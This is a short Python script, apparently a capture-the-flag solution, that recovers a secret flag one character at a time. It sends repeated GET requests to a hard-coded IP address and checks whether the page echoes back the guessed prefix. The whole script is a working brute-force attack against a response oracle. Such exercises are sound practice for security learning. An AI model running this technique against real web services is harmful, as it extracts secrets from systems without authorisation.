#!/usr/bin/python3

import requests

base_url = "http://172.105.154.14/?flag="
flag = "shctf{"

while len(flag) < 25:
	for guess in range(33, 127):

		nextchar = chr(guess)
		response = requests.get(base_url + flag + nextchar).text

		# get <div> where flag is displayed
		start = response.find("<div id=\"grid\"")

		# extract characters shown
		body = response[start + 16:-7].replace("<div>","").replace("</div>","")
		result = "".join(body.split())

		# check if website output matches input
		if (result == flag + nextchar):
			
			# update flag
			flag += nextchar
			print(flag)
			break

